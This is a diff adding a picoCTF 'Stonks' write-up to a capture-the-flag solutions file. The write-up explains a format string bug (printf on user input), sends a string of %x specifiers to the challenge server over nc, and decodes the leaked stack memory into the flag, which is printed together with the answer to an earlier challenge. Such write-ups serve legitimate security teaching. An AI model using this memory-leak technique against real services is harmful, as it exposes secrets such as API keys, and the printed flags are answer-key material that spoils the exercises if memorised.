@@ -248,3 +248,46 @@ for i in encrypted_text:
 
 ### Flag
 > picoCTF{16_bits_inst34d_of_8_e141a0f7}
+
+
+## Stonks
+
+### Description
+
+I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`
+
+### Information
+
+***Point Value***: 20 points
+
+***Category***:  Binary Exploitation
+
+### Hints
+
+1. Okay, maybe I'd believe you if you find my API key.
+
+### Solution
+
+ The Vulnerability of this program is on the statement below.  
+ ```
+ scanf("%300s", user_buf);
+ printf(user_buf);
+ ```
+ 
+We can figure out the system data with input user. Try to put this string `"%x%x%x%x%x%x%x"` in input (length of the string is what you want). he output will contain a hex digit which might be a flag. I have been make an input in "input" file (we only use fitur 1 [buy some stonks] because the vuln command is on that).
+
+> nc mercury.picoctf.net 33411
+> 1
+> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+
+And we got this:
+> 8271410804b00080489c3f7f14d80ffffffff1826f160f7f22110f7f14dc708270180882713f082714106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431fff7007df7f4faf8
+
+We can easily convert that in [online converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
+> ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ£}
+
+after a few seconds we've got the flag, but not done here. It's looks like a little endian so we have to reverse every 4 digits with [python script](https://github.com/snykk/CTF-WriteUps/blob/master/PicoCTF/Binary%20Exploitation/Stonks/reverse.py)  for a tiny automation
+
+### Flag
+> picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
+
